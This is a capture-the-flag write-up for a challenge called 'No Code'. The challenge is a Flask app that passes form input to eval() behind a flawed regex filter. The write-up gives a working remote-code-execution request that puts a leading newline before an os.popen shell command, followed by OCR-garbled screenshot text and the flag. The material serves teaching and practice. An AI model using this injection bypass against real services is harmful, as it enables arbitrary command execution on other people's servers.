# No Code
> I made a web app that lets you run any code you want. Just kidding!

## About the Challenge
We got a website and also a Python code. Here is the content of `app.py`

```python
from flask import Flask, request, jsonify
import re

app = Flask(__name__)

@app.route('/execute', methods=['POST'])
def execute_code():
    code = request.form.get('code', '')
    if re.match(".*[\x20-\x7E]+.*", code):
        return jsonify({"output": "jk lmao no code"}), 403
    result = ""
    try:
        result = eval(code)
    except Exception as e:
        result = str(e)

    return jsonify({"output": result}), 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=1337, debug=False)
```

In this case, we can execute a Python code but there's a regex here `.*[\x20-\x7E]+.*` (matches any string that has at least one printable ASCII character) so basically we "cant" input anything here

## How to Solve?
We can bypass it using a new line (\n) to execute a Python code. Here is the example

```
POST /execute HTTP/1.1
Host: uoftctf-no-code.chals.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

code=
__import__("os").popen("cat flag.txt").read()
```


[Image extracted text: Request
Response
Pretty
Raw
Hex
0 In
=
Pretty
Raw
Hex
Render
PosT
lexecute
HTTP/1.1
HTTP/1.1
200
OK
2
Host:
uoftctf-no-code.chals
io
2 Server:
Werkzeug/3.0.1 Python/3.10
13
3
Upgrade-Insecure-Requests:
1/
3
Date
Mon ,
15
Jan
2024
11:14.02
GMT
Referer:
http: //uoftctf-no-code. chals. io/
Content-Type
application/ json
5 Content-Type
application/X-WWW-form-urlencoded
5 Content-Length:
43
6 Content-Length:
52
6
Connection:
close
7
8
code=
8
import_ ( "os" ) . popen ( "cat
txt"). read ( )
"output" :"uoftctf{r3g3x_3plc_f41L_XDDD}"
flag.]


## Flag
```
uoftctf{r3g3x_3p1c_f41L_XDDD}
```